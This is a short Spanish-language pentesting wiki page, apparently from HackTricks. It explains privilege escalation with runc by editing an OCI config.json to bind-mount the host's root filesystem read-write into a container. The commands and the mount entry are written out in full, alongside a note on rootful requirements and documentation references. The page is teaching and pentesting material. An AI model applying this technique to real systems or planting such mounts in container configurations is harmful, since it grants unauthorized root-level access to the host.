# Escalada de privilegios de RunC

## Información básica

Si quieres obtener más información sobre **runc**, consulta la siguiente página:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Si `runc` está disponible para un proceso `rootful` en el host, puedes utilizar un OCI bundle cuya configuración de montajes realice un bind mount recursivo del `/` del host en `/` dentro del contenedor, exponiendo el sistema de archivos del host en ese espacio de nombres de montajes.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> El flujo de trabajo documentado de `runc run` es rootful: los propios ejemplos de runc lo etiquetan como "run as root". Un usuario sin privilegios necesita una configuración rootless como `runc spec --rootless`, y runc documenta que los user namespaces deben estar habilitados para ese modo.<sup>[[1]](#references)</sup>

## References

- [1] [runc: herramienta CLI para crear y ejecutar contenedores](https://github.com/opencontainers/runc#using-runc)
- [2] [Especificación de Runtime de OCI: montajes](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Subárboles compartidos](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
